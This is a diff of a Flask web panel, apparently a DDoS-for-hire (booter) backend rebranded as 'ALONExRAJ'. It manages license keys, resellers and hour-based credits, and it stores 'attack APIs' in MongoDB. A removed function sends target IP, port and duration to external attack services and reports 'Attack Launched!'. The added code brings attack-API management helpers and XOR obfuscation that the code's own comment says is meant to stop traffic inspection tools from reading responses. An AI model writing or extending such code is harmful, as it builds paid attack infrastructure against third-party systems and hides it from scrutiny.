@@ -1,26 +1,22 @@
-import json
+﻿import json
 import os
 import secrets
 import hashlib
-import hmac
 import base64
 import time
 import threading
 import requests
-import concurrent.futures
-from collections import deque, defaultdict
+from collections import defaultdict
 from datetime import datetime, timedelta, timezone
-from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, make_response, send_from_directory
+from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, make_response
 from functools import wraps
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
 from pymongo import MongoClient
 
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 # ENV LOADER — supports .env file (no external dep)
-# Load order: ENV_FILE env var > vishalpro.env > .env
+# Load order: ENV_FILE env var > alonexraj.env > .env
 # Existing os.environ values are NOT overridden (real env wins).
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 def _load_env_file(path):
     if not path or not os.path.isfile(path):
         return False
@@ -43,35 +39,31 @@ def _load_env_file(path):
         print(f"[! ENV] Failed to load {path}: {e}")
         return False
 
-_env_candidates = [os.environ.get('ENV_FILE'), 'vishalpro.env', '.env']
+_env_candidates = [os.environ.get('ENV_FILE'), 'alonexraj.env', '.env']
 for _p in _env_candidates:
     if _load_env_file(_p):
         break
 
 app = Flask(__name__)
 
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 # CONFIG — values from .env, fallback to empty string
-# Set them in vishalpro.env (local) OR Render/Railway env vars (production)
-# ══════════════════════════════════════════════════════════════════
+# Set them in alonexraj.env (local) OR Render/Railway env vars (production)
+# ═══════════════════════════════════════════════════════════════════
 app.secret_key = os.getenv('FLASK_SECRET_KEY', '') or secrets.token_hex(16)
 
 # Owner credentials
 OWNER_USER = os.getenv('OWNER_USER', '')
 OWNER_PASS = os.getenv('OWNER_PASS', '')
 
-# Shared secret keys — must match Android app
-HMAC_SECRET = os.getenv('HMAC_SECRET', '')
-AES_KEY = os.getenv('AES_KEY', '').encode('utf-8')
-
 # MongoDB
 MONGO_URI = os.getenv('MONGO_URI', '')
-MONGO_DB_NAME = os.getenv('MONGO_DB_NAME', 'vishalpro_panel')
+MONGO_DB_NAME = os.getenv('MONGO_DB_NAME', 'alonexraj_panel')
 
 # Warn loudly if critical vars are missing — but don't crash on import
 _missing = [k for k, v in {
     'OWNER_USER': OWNER_USER, 'OWNER_PASS': OWNER_PASS,
-    'HMAC_SECRET': HMAC_SECRET, 'MONGO_URI': MONGO_URI,
+    'MONGO_URI': MONGO_URI,
 }.items() if not v]
 if _missing:
     print(f"[! WARN] Missing env vars: {', '.join(_missing)}. Configure them in env to enable full functionality.")
@@ -84,24 +76,92 @@ keys_col = db['keys'] if db is not None else None
 connections_col = db['connections'] if db is not None else None
 resellers_col = db['resellers'] if db is not None else None
 history_col = db['key_history'] if db is not None else None
-config_col = db['config'] if db is not None else None
 attack_apis_col = db['attack_apis'] if db is not None else None
+challenges_col = db['challenges'] if db is not None else None
+sessions_col = db['sessions'] if db is not None else None
+
+# Create TTL index on challenges collection (expires_at field) — MongoDB auto-deletes expired docs
+if challenges_col is not None:
+    try:
+        challenges_col.create_index('expires_at', expireAfterSeconds=0)
+    except Exception:
+        pass  # Index may already exist
 
 # Credit rate: 10 credits = 1 hour
 CREDITS_PER_HOUR = int(os.environ.get('CREDITS_PER_HOUR', '10'))
 
 
-# ══════════════════════════════════════════════════════════════════
-# DATA HELPERS — MongoDB
-# ══════════════════════════════════════════════════════════════════
-# Keep alive thread for Render free tier
+# ═══════════════════════════════════════════════════════════════════
+# RESPONSE ENCODING — XOR with random nonce (obfuscation, NOT encryption)
+# Every response looks different (random nonce). HTTP Canary can't parse it.
+# No secrets needed — security comes from challenge-response verification.
+# ═══════════════════════════════════════════════════════════════════
+
+def encode_response(data_dict):
+    """Encode a dict into XOR-obfuscated base64 string. Not readable JSON."""
+    raw = json.dumps(data_dict, separators=(',', ':')).encode('utf-8')
+    nonce = os.urandom(16)
+    # XOR with repeating nonce
+    encoded = bytes([raw[i] ^ nonce[i % 16] for i in range(len(raw))])
+    # Pack: nonce(16) + encoded_data
+    packed = nonce + encoded
+    return base64.b64encode(packed).decode('utf-8')
+
+
+def decode_request(encoded_str):
+    """Decode XOR-obfuscated base64 string back to dict. Returns dict or None."""
+    try:
+        packed = base64.b64decode(encoded_str)
+        if len(packed) < 17:
+            return None
+        nonce = packed[:16]
+        encoded_data = packed[16:]
+        raw = bytes([encoded_data[i] ^ nonce[i % 16] for i in range(len(encoded_data))])
+        return json.loads(raw.decode('utf-8'))
+    except Exception:
+        return None
+
+
+def make_encoded_response(data_dict, status_code=200):
+    """Create an obfuscated HTTP response (looks like random base64, not JSON)."""
+    encoded = encode_response(data_dict)
+    resp = make_response(encoded, status_code)
+    resp.headers['Content-Type'] = 'application/octet-stream'
+    resp.headers['X-Request-Id'] = secrets.token_hex(4)  # decoy header
+    return resp
+
+
+def get_decoded_request():
+    """
+    Decode incoming request body.
+    Supports both:
+    - Encrypted (XOR+nonce base64) — from updated app
+    - Plain JSON — for backward compatibility / testing
+    Returns dict or empty dict.
+    """
+    raw = request.get_data(as_text=True).strip()
+    if not raw:
+        return {}
+    # Try decoding as encrypted first
+    decoded = decode_request(raw)
+    if decoded and isinstance(decoded, dict):
+        return decoded
+    # Fallback: try plain JSON
+    try:
+        return request.json or {}
+    except Exception:
+        return {}
+
+
+# ═══════════════════════════════════════════════════════════════════
+# KEEP-ALIVE PING THREAD & HEALTH ENDPOINT
+# ═══════════════════════════════════════════════════════════════════
 
 def keep_alive_ping():
     """Background thread to ping the app every 4 minutes"""
     while True:
         time.sleep(240)  # 4 minutes (Render idle timeout is 15 minutes)
         try:
-            # Get the port from environment or use default
             port = int(os.environ.get('PORT', 3000))
             url = f"http://localhost:{port}/health"
             response = requests.get(url, timeout=5)
@@ -114,18 +174,18 @@ def keep_alive_ping():
         except Exception as e:
             print(f"[! Keep-Alive] Unexpected error: {e}")
 
-# Health check endpoint for uptime monitoring
+
 @app.route('/health', methods=['GET'])
 def health_check():
     """Simple health check endpoint for keep-alive services"""
     return jsonify({
         'status': 'alive',
         'timestamp': datetime.utcnow().isoformat() + 'Z',
-        'service': 'VISHAL PRO Panel',
-        'version': '2.0'
+        'service': 'ALONExRAJ Panel',
+        'version': '4.0'
     })
 
-# Start keep-alive thread (only if not disabled via environment variable)
+
 def start_keep_alive():
     """Initialize the keep-alive background thread"""
     if os.environ.get('DISABLE_KEEP_ALIVE', '').lower() != 'true':
@@ -135,11 +195,15 @@ def start_keep_alive():
         print("[✓ Keep-Alive] Will ping every 4 minutes to prevent spin-down")
     else:
         print("[! Keep-Alive] Disabled via DISABLE_KEEP_ALIVE environment variable")
-        
+
+
+# ═══════════════════════════════════════════════════════════════════
+# DATA HELPERS — MongoDB
+# ═══════════════════════════════════════════════════════════════════
+
 def load_keys():
     """Load active keys, auto-remove expired ones."""
     now = datetime.utcnow().isoformat() + 'Z'
-    # Remove expired keys that have expires_at set and are past expiry
     all_keys = list(keys_col.find({}, {'_id': 0}))
     active_keys = []
     for k in all_keys:
@@ -193,132 +257,34 @@ def load_history():
 def save_history_record(record):
     history_col.insert_one(record)
 
-def load_update_config():
-    doc = config_col.find_one({'_type': 'update_config'}, {'_id': 0})
-    if doc:
-        doc.pop('_type', None)
-        return doc
-    return {"latest_version_code": 1, "latest_version_name": "1.0", "apk_filename": "", "changelog": ""}
-
-def save_update_config(config):
-    config['_type'] = 'update_config'
-    config_col.update_one({'_type': 'update_config'}, {'$set': config}, upsert=True)
 
 
-# ══════════════════════════════════════════════════════════════════
-# CRYPTO + PROXY
-# ══════════════════════════════════════════════════════════════════
 
-def encrypt_response(data_dict):
-    plaintext = json.dumps(data_dict).encode('utf-8')
-    iv = os.urandom(16)
-    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
-    ct = cipher.encrypt(pad(plaintext, AES.block_size))
-    return base64.b64encode(iv + ct).decode('utf-8')
+# ═══════════════════════════════════════════════════════════════════
+# ATTACK API HELPERS — MongoDB
+# ═══════════════════════════════════════════════════════════════════
 
-def encrypted_reply(data_dict):
-    """
-    Response handler — always returns plain JSON for new apps.
-    Legacy apps (without X-App-Version header) still get AES encrypted.
-    """
-    # Always return plain JSON — encryption happens at transport layer (HTTPS)
-    app_version = request.headers.get('X-App-Version', '')
-    if app_version:
-        return jsonify(data_dict)
-    
-    # Legacy: AES encrypted (old apps without X-App-Version header)
-    try:
-        encrypted = encrypt_response(data_dict)
-        resp = make_response(encrypted, 200)
-        resp.headers['Content-Type'] = 'application/octet-stream'
-        return resp
-    except Exception:
-        return jsonify(data_dict)
+def load_attack_apis():
+    """Load all attack APIs sorted by priority."""
+    return list(attack_apis_col.find({}, {'_id': 0}).sort('priority', 1))
 
-def proxy_attack(ip, port, time_sec):
-    """
-    Simple multi-API attack.
-    
-    APIs are loaded from:
-    1. MongoDB (added via panel dashboard — no restart needed)
-    2. .env fallback (ATTACK_API_1, ATTACK_API_2, etc.)
-    
-    URL format: Use {ip}, {port}, {time} placeholders.
-    Example: https://myapi.com/attack?target={ip}&port={port}&time={time}&key=ABC
-    
-    Panel replaces placeholders and sends GET request.
-    Priority order: lower number = higher priority.
-    """
-    apis = []
-    
-    # 1. Load from MongoDB (dashboard se add kiye gaye)
-    if attack_apis_col is not None:
-        db_apis = list(attack_apis_col.find({'enabled': True}, {'_id': 0}).sort('priority', 1))
-        for api in db_apis:
-            if api.get('url'):
-                apis.append(api['url'])
-    
-    # 2. Fallback: load from env (ATTACK_API_1, ATTACK_API_2, ...)
-    if not apis:
-        for i in range(1, 11):
-            url_template = os.getenv(f'ATTACK_API_{i}', '')
-            if url_template:
-                apis.append(url_template)
-    
-    if not apis:
-        return {"status": "error", "message": "No attack APIs configured. Add via dashboard."}
-    
-    # Try each API in order
-    for url_template in apis:
-        try:
-            url = url_template.replace('{ip}', str(ip)).replace('{port}', str(port)).replace('{time}', str(time_sec))
-            r = requests.get(url, timeout=12)
-            
-            # Parse actual response from API
-            api_response = None
-            try:
-                api_response = r.json()
-            except:
-                api_response = {"raw": r.text[:200]}
-            
-            if r.status_code == 200:
-                # Check if API actually succeeded (not just HTTP 200)
-                is_success = False
-                if isinstance(api_response, dict):
-                    is_success = (
-                        api_response.get('success') == True or
-                        str(api_response.get('status', '')).lower() in ('queued', 'success', 'ok', 'sent', 'launched', 'started') or
-                        'attack' in str(api_response).lower() and 'error' not in str(api_response).lower()
-                    )
-                else:
-                    is_success = True  # Non-JSON 200 = probably success
-                
-                if is_success:
-                    return {
-                        "status": "queued",
-                        "message": api_response.get('message', '⚡ Attack Launched!') if isinstance(api_response, dict) else '⚡ Attack Launched!',
-                        "target": f"{ip}:{port}",
-                        "api_response": api_response
-                    }
-                else:
-                    # API returned 200 but with error in body — try next API
-                    continue
-            else:
-                # Non-200 status — try next API
-                continue
-                
-        except Exception:
-            continue
-    
-    return {"status": "error", "message": "All APIs failed", "target": f"{ip}:{port}"}
+def load_enabled_attack_apis():
+    """Load enabled attack APIs sorted by priority."""
+    return list(attack_apis_col.find({'enabled': True}, {'_id': 0}).sort('priority', 1))
 
-def proxy_status():
-    """Simple online check"""
-    return {"status": "online"}
+def find_attack_api(api_id):
+    return attack_apis_col.find_one({'id': api_id}, {'_id': 0})
 
-def sign_response(expires_at, device_id):
-    msg = "{}|{}".format(expires_at or "", device_id or "")
-    return hmac.HMAC(HMAC_SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()[:16]
+def save_attack_api(record):
+    attack_apis_col.update_one({'id': record['id']}, {'$set': record}, upsert=True)
+
+def delete_attack_api(api_id):
+    attack_apis_col.delete_one({'id': api_id})
+
+
+# ═══════════════════════════════════════════════════════════════════
+# UTILITY
+# ═══════════════════════════════════════════════════════════════════
 
 def get_client_ip():
     if request.headers.get('X-Forwarded-For'):
@@ -326,9 +292,9 @@ def get_client_ip():
     return request.remote_addr
 
 
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 # RATE LIMITER (in-memory, per-IP) — login brute-force protection
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 _time_mod = time
 _login_attempts = defaultdict(list)   # ip -> [timestamp, ...]
 _login_lockouts = {}                  # ip -> unlock_timestamp
@@ -341,14 +307,12 @@ LOGIN_LOCKOUT_SEC = int(os.environ.get('LOGIN_LOCKOUT_SEC', '900'))  # 15 min
 def login_check_rate(ip):
     """Returns (allowed: bool, retry_after_sec: int, attempts_remaining: int)."""
     now = _time_mod.time()
-    # Currently locked out?
     unlock_at = _login_lockouts.get(ip)
     if unlock_at and now < unlock_at:
         return False, int(unlock_at - now), 0
     if unlock_at and now >= unlock_at:
         _login_lockouts.pop(ip, None)
         _login_attempts.pop(ip, None)
-    # Prune old attempts
     cutoff = now - LOGIN_WINDOW_SEC
     _login_attempts[ip] = [t for t in _login_attempts[ip] if t > cutoff]
     remaining = LOGIN_MAX_ATTEMPTS - len(_login_attempts[ip])
@@ -368,82 +332,9 @@ def login_record_success(ip):
     _login_lockouts.pop(ip, None)
 
 
-# ══════════════════════════════════════════════════════════════════
-# API RATE LIMITER — protects /connect from DDoS/spam
-# Even if panel URL leaks, attackers can't take it down easily.
-# ══════════════════════════════════════════════════════════════════
-_api_requests = defaultdict(list)    # ip -> [timestamp, ...]
-_api_blocked = {}                    # ip -> unblock_timestamp
-
-# Config (override via env)
-API_MAX_REQUESTS = int(os.environ.get('API_MAX_REQUESTS', '30'))      # max requests per window
-API_WINDOW_SEC = int(os.environ.get('API_WINDOW_SEC', '60'))          # window = 60 seconds
-API_BLOCK_SEC = int(os.environ.get('API_BLOCK_SEC', '300'))           # block for 5 min after abuse
-API_ACCESS_TOKEN = os.environ.get('API_ACCESS_TOKEN', '')             # optional app-level token
-
-def api_check_rate(ip):
-    """Check if IP is allowed to make API requests. Returns (allowed, retry_after)."""
-    now = _time_mod.time()
-    # Currently blocked?
-    unblock_at = _api_blocked.get(ip)
-    if unblock_at and now < unblock_at:
-        return False, int(unblock_at - now)
-    if unblock_at and now >= unblock_at:
-        _api_blocked.pop(ip, None)
-        _api_requests.pop(ip, None)
-    # Prune old requests
-    cutoff = now - API_WINDOW_SEC
-    _api_requests[ip] = [t for t in _api_requests[ip] if t > cutoff]
-    if len(_api_requests[ip]) >= API_MAX_REQUESTS:
-        _api_blocked[ip] = now + API_BLOCK_SEC
-        print(f"[! API-RATE] Blocked IP {ip} for {API_BLOCK_SEC}s — {len(_api_requests[ip])} requests in {API_WINDOW_SEC}s")
-        return False, API_BLOCK_SEC
-    return True, 0
-
-def api_record_request(ip):
-    """Record an API request from this IP."""
-    _api_requests[ip].append(_time_mod.time())
-
-def validate_app_request():
-    """
-    Validate that the request comes from a legitimate app, not random scanner/attacker.
-    Checks:
-    1. Must be POST
-    2. Must have Content-Type: application/json (or octet-stream for encrypted)
-    3. Must have X-App-Version header (our app always sends this)
-    4. If API_ACCESS_TOKEN is set, must match X-Access-Token header
-    5. Body must not be empty
-    Returns (valid: bool, error_message: str)
-    """
-    # Check method
-    if request.method != 'POST':
-        return False, 'Method not allowed'
-    
-    # Check content type
-    ct = request.headers.get('Content-Type', '')
-    if 'json' not in ct and 'octet-stream' not in ct:
-        return False, 'Invalid content type'
-    
-    # Check app version header (all our app versions send this)
-    if not request.headers.get('X-App-Version') and not request.headers.get('X-Timestamp'):
-        return False, 'Missing required headers'
-    
-    # Check optional access token (if configured)
-    if API_ACCESS_TOKEN:
-        token = request.headers.get('X-Access-Token', '')
-        if token != API_ACCESS_TOKEN:
-            return False, 'Unauthorized'
-    
-    # Check body is not empty
-    if not request.get_data():
-        return False, 'Empty body'
-    
-    return True, ''
-
-
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 # AUTH HELPERS
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 
 def is_owner():
     return session.get('role') == 'owner'
@@ -468,16 +359,17 @@ def owner_required(f):
     return decorated
 
 
-# ══════════════════════════════════════════════════════════════════
+
+# ═══════════════════════════════════════════════════════════════════
 # HTML TEMPLATES
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 
 LOGIN_TEMPLATE = '''<!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>VISHAL PRO Panel — Login</title>
+<title>ALONExRAJ Panel – Login</title>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Plus Jakarta Sans',sans-serif}
@@ -541,7 +433,7 @@ cursor:pointer;transition:.25s;margin-top:8px;box-shadow:0 8px 24px rgba(139,92,
 <path d="M9 12l2 2 4-4" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
 </svg>
 </div>
-<h1>VISHAL PRO</h1>
+<h1>ALONExRAJ</h1>
 <div class="tagline">Premium Key Management & Reseller Panel</div>
 <div class="feats">
 <div class="feat"><div class="dot"></div>Secure Key Generation</div>
@@ -558,11 +450,10 @@ cursor:pointer;transition:.25s;margin-top:8px;box-shadow:0 8px 24px rgba(139,92,
 <div class="ig"><label>Password</label><input name="password" type="password" placeholder="••••••••••" required></div>
 <button type="submit" class="btn-submit">Sign In</button>
 </form>
-<div class="ft">© 2025 <span>VISHAL PRO</span> Premium Panel</div>
+<div class="ft">© 2025 <span>ALONExRAJ</span> Premium Panel</div>
 </div>
 </div>
 <script>
-// Apply saved theme on login page too
 (function(){
   let saved=null;
   try{saved=localStorage.getItem('theme');}catch(e){}
@@ -572,6 +463,7 @@ cursor:pointer;transition:.25s;margin-top:8px;box-shadow:0 8px 24px rgba(139,92,
 </script>
 </body>
 </html>'''
+
 
 DASHBOARD_TEMPLATE = '''<!doctype html>
 <html lang="en">
@@ -583,9 +475,6 @@ DASHBOARD_TEMPLATE = '''<!doctype html>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Plus Jakarta Sans',sans-serif}
 
-/* ═══════════════════════════════════════════════════════════
-   THEME VARIABLES — light (default) + dark (data-theme="dark")
-   ═══════════════════════════════════════════════════════════ */
 :root{
   --bg-grad:linear-gradient(180deg,#f8f9ff 0%,#eef0fc 100%);
   --surface:#ffffff;
@@ -652,7 +541,6 @@ body{background:var(--bg-grad);color:var(--text);min-height:100vh;transition:bac
 .topbar .user-info span{color:var(--text);font-weight:600}
 .topbar a.logout-link{color:var(--logout-color);text-decoration:none;font-size:13px;font-weight:600;padding:7px 14px;border-radius:8px;background:var(--logout-bg);transition:.2s}
 .topbar a.logout-link:hover{background:var(--logout-hover)}
-/* Theme toggle */
 .theme-toggle{background:var(--surface-3);border:none;color:var(--text);width:36px;height:36px;border-radius:10px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:16px;transition:.2s}
 .theme-toggle:hover{background:var(--border-2);transform:scale(1.05)}
 .theme-toggle .sun{display:none}
@@ -660,8 +548,6 @@ body{background:var(--bg-grad);color:var(--text);min-height:100vh;transition:bac
 [data-theme="dark"] .theme-toggle .sun{display:block}
 [data-theme="dark"] .theme-toggle .moon{display:none}
 .container{max-width:1100px;margin:0 auto;padding:24px 20px 60px}
-
-/* Hero greeting card */
 .hero{background:var(--surface);border-radius:20px;padding:24px 26px;margin-bottom:20px;display:flex;align-items:center;gap:18px;box-shadow:var(--shadow);position:relative;overflow:hidden;border:1px solid var(--border)}
 .hero::before{content:'';position:absolute;width:200px;height:200px;border-radius:50%;background:linear-gradient(135deg,#a78bfa20,#f0abfc20);top:-80px;right:-60px}
 .hero .hero-icon{width:54px;height:54px;border-radius:16px;background:linear-gradient(135deg,#6366f1,#8b5cf6);display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 8px 20px rgba(99,102,241,.35);position:relative;z-index:1}
@@ -675,8 +561,6 @@ body{background:var(--bg-grad);color:var(--text);min-height:100vh;transition:bac
 .hero-btn.primary:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(59,130,246,.4)}
 .hero-btn.outline{background:var(--surface);color:var(--text-muted);border:1.5px solid var(--border-2)}
 .hero-btn.outline:hover{border-color:#8b5cf6;color:#8b5cf6}
-
-/* Gradient stat cards */
 .cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;margin-bottom:24px}
 .stat-card{border-radius:18px;padding:20px;color:#fff;position:relative;overflow:hidden;transition:.25s;box-shadow:0 8px 24px rgba(0,0,0,.08);cursor:default}
 .stat-card:hover{transform:translateY(-3px);box-shadow:0 14px 32px rgba(0,0,0,.12)}
@@ -692,8 +576,6 @@ body{background:var(--bg-grad);color:var(--text);min-height:100vh;transition:bac
 .sc-purple{background:linear-gradient(135deg,#a855f7,#7c3aed)}
 .sc-pink{background:linear-gradient(135deg,#ec4899,#be185d)}
 .sc-cyan{background:linear-gradient(135deg,#06b6d4,#0891b2)}
-
-/* Section panels */
 .section{background:var(--surface);border-radius:18px;padding:22px;margin-bottom:16px;box-shadow:var(--shadow);border:1px solid var(--border)}
 .section-head{display:flex;align-items:center;gap:12px;margin-bottom:16px}
 .section-head .se-icon{width:40px;height:40px;border-radius:12px;background:linear-gradient(135deg,#a855f7,#7c3aed);display:flex;align-items:center;justify-content:center;color:#fff;flex-shrink:0;box-shadow:0 4px 12px rgba(168,85,247,.25)}
@@ -703,8 +585,6 @@ body{background:var(--bg-grad);color:var(--text);min-height:100vh;transition:bac
 .section-head .se-spacer{flex:1}
 .section-head .view-all{font-size:13px;font-weight:600;color:var(--link);text-decoration:none;cursor:pointer;display:flex;align-items:center;gap:4px}
 .section-head .view-all:hover{color:var(--primary-hover)}
-
-/* Buttons */
 .btn{padding:10px 18px;border:none;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;transition:.2s}
 .btn:hover{transform:translateY(-1px)}
 .btn-blue{background:linear-gradient(135deg,#3b82f6,#6366f1);color:#fff;box-shadow:0 4px 12px rgba(59,130,246,.25)}
@@ -715,52 +595,48 @@ body{background:var(--bg-grad);color:var(--text);min-height:100vh;transition:bac
 .btn-purple:hover{box-shadow:0 6px 18px rgba(168,85,247,.35)}
 .btn-red{background:#fef2f2;color:#dc2626;border:1.5px solid #fecaca}
 .btn-red:hover{background:#fee2e2}
-
-/* Forms */
+.btn-orange{background:linear-gradient(135deg,#f59e0b,#ea580c);color:#fff;box-shadow:0 4px 12px rgba(245,158,11,.25)}
+.btn-orange:hover{box-shadow:0 6px 18px rgba(245,158,11,.35)}
 .form-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px}
 .form-group label{display:block;font-size:11px;color:var(--text-muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px;font-weight:600}
-.form-group input,.form-group select{width:100%;padding:11px 14px;background:var(--surface-2);border:1.5px solid var(--border-2);border-radius:10px;color:var(--text);font-size:14px;transition:.2s;font-weight:500;font-family:inherit}
-.form-group input:focus,.form-group select:focus{outline:none;border-color:#8b5cf6;background:var(--surface);box-shadow:0 0 0 3px rgba(139,92,246,.15)}
-
-/* Tables */
+.form-group input,.form-group select,.form-group textarea{width:100%;padding:11px 14px;background:var(--surface-2);border:1.5px solid var(--border-2);border-radius:10px;color:var(--text);font-size:14px;transition:.2s;font-weight:500;font-family:inherit}
+.form-group textarea{resize:vertical;min-height:60px}
+.form-group input:focus,.form-group select:focus,.form-group textarea:focus{outline:none;border-color:#8b5cf6;background:var(--surface);box-shadow:0 0 0 3px rgba(139,92,246,.15)}
 .table-wrap{overflow-x:auto;border-radius:12px;border:1px solid var(--border)}
 table{width:100%;border-collapse:collapse}
 th{text-align:left;padding:12px 14px;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px;background:var(--table-head);font-weight:700;border-bottom:1px solid var(--border)}
 td{padding:12px 14px;font-size:13px;color:var(--text);border-bottom:1px solid var(--border);font-weight:500}
 tr:last-child td{border-bottom:none}
 tr:hover td{background:var(--row-hover)}
-
-/* Badges */
 .badge{padding:4px 10px;border-radius:20px;font-size:11px;font-weight:700;display:inline-block}
 .badge-active{background:#d1fae5;color:#059669}
 .badge-expired{background:#fee2e2;color:#dc2626}
 .badge-unredeemed{background:#fef3c7;color:#d97706}
+.badge-enabled{background:#d1fae5;color:#059669}
+.badge-disabled{background:#fee2e2;color:#dc2626}
 .mono{font-family:'JetBrains Mono',monospace;font-size:12px;color:#6366f1;font-weight:600}
-
-/* Empty state */
 .empty{padding:40px 20px;text-align:center;color:var(--text-soft)}
 .empty .empty-icon{width:64px;height:64px;border-radius:18px;background:var(--empty-icon-bg);display:inline-flex;align-items:center;justify-content:center;margin-bottom:14px}
 .empty .empty-icon svg{width:32px;height:32px;color:var(--empty-icon-color)}
 .empty p{font-size:14px;font-weight:600;color:var(--text-muted);margin-bottom:4px}
 .empty span{font-size:12px;color:var(--text-soft)}
-
-/* Modal */
 .modal-bg{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:var(--modal-bg);backdrop-filter:blur(6px);z-index:200;align-items:center;justify-content:center;padding:20px}
 .modal-bg.active{display:flex}
-.modal{background:var(--surface);border-radius:20px;padding:28px;width:100%;max-width:520px;max-height:90vh;overflow-y:auto;box-shadow:0 30px 60px rgba(0,0,0,.3);border:1px solid var(--border)}
+.modal{background:var(--surface);border-radius:20px;padding:28px;width:100%;max-width:580px;max-height:90vh;overflow-y:auto;box-shadow:0 30px 60px rgba(0,0,0,.3);border:1px solid var(--border)}
 .modal h3{color:var(--text);margin-bottom:18px;font-size:19px;font-weight:800;letter-spacing:-.3px}
 .modal .close-btn{float:right;background:var(--surface-3);border:none;color:var(--text-muted);font-size:18px;cursor:pointer;width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;transition:.2s}
 .modal .close-btn:hover{background:var(--logout-hover);color:var(--logout-color)}
-
-/* Credit pill in topbar */
 .credit-badge{background:linear-gradient(135deg,#fbbf24,#f59e0b);color:#fff;padding:6px 14px;border-radius:20px;font-size:12px;font-weight:700;box-shadow:0 4px 10px rgba(245,158,11,.3);display:inline-flex;align-items:center;gap:6px}
 .credit-badge::before{content:'⚡'}
-
-/* Toolbar (action buttons row) */
 .toolbar{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;margin-bottom:18px}
 .toolbar h2{font-size:20px;font-weight:800;color:#1a1a2e;letter-spacing:-.3px}
 .toolbar .actions{display:flex;gap:10px;flex-wrap:wrap}
-
+.toggle-switch{position:relative;display:inline-block;width:44px;height:24px}
+.toggle-switch input{opacity:0;width:0;height:0}
+.toggle-switch .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background:#ccc;border-radius:24px;transition:.3s}
+.toggle-switch .slider:before{position:absolute;content:'';height:18px;width:18px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:.3s}
+.toggle-switch input:checked+.slider{background:#10b981}
+.toggle-switch input:checked+.slider:before{transform:translateX(20px)}
 @media(max-width:700px){.cards{grid-template-columns:1fr}.form-grid{grid-template-columns:1fr}.hero{flex-direction:column;align-items:flex-start;text-align:left}.hero .hero-actions{width:100%}.hero-btn{flex:1;justify-content:center}}
 @keyframes fadeOut{0%,70%{opacity:1}100%{opacity:0;transform:translateY(-10px)}}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
@@ -771,7 +647,7 @@ tr:hover td{background:var(--row-hover)}
 <div class="topbar">
 <div class="brand-wrap">
 <div class="brand-icon">A</div>
-<div class="brand">VISHAL PRO</div>
+<div class="brand">ALONExRAJ</div>
 </div>
 <div class="user-info">
 <span>{{ display_name }}</span>
@@ -800,9 +676,6 @@ modalBg.addEventListener('click',e=>{if(e.target===modalBg)closeModal()});
 
 async function api(url,opts){const r=await fetch(url,opts);return r.json();}
 
-// ═══════════════════════════════════════════
-// THEME (light/dark) — persisted in localStorage
-// ═══════════════════════════════════════════
 function applyTheme(t){
   document.documentElement.setAttribute('data-theme', t);
   try{localStorage.setItem('theme', t);}catch(e){}
@@ -811,7 +684,7 @@ function toggleTheme(){
   const cur=document.documentElement.getAttribute('data-theme')||'light';
   applyTheme(cur==='dark'?'light':'dark');
 }
-// Init on load — saved choice OR system preference
+
 (function(){
   let saved=null;
   try{saved=localStorage.getItem('theme');}catch(e){}
@@ -827,7 +700,8 @@ function greeting(){
   return'Good evening';
 }
 
-// SVG icon helpers
+function copyKey(k){navigator.clipboard.writeText(k).then(()=>{}).catch(()=>{const t=document.createElement('textarea');t.value=k;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);});}
+
 const ICONS={
   spark:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M5.6 18.4l2.1-2.1M16.3 7.7l2.1-2.1"/></svg>',
   key:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="8" cy="14" r="4"/><path d="M11 11l8-8 3 3M16 6l3 3"/></svg>',
@@ -839,18 +713,19 @@ const ICONS={
   plus:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 5v14M5 12h14"/></svg>',
   arrow:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="width:14px;height:14px"><path d="M5 12h14M13 6l6 6-6 6"/></svg>',
